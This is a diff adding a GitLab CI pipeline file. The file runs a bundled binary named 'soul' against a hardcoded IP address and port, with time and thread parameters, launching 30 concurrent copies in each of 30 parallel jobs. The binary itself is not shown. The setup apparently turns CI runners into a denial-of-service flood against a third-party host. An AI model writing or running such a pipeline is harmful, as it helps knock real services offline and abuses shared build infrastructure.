@@ -1,0 +1,33 @@
+image: ubuntu:latest  # Use the latest Ubuntu image
+
+stages:
+  - run_jobs
+
+variables:
+  IP: "20.235.53.164"
+  PORT: "23628"
+  TIME: "300"  # Adjust this as needed
+  THREADS: "100"  # Adjust this as needed
+  CONCURRENCY: 30
+
+before_script:
+  - chmod +x ./soul  # Give execution permission to the `soul` binary
+
+run_soul:
+  stage: run_jobs
+  script:
+    - echo "Starting 30 concurrent jobs..."
+    - |
+      for i in $(seq 1 $CONCURRENCY); do
+        # Run `soul` binary with provided parameters (IP, PORT, TIME, THREADS)
+        ./soul $IP $PORT $TIME $THREADS &
+      done
+    - wait
+  parallel: 30
+  only:
+    - main
+
+cache:
+  paths:
+    - /var/cache/apt/archives/
+    - /root/.cache/pip/
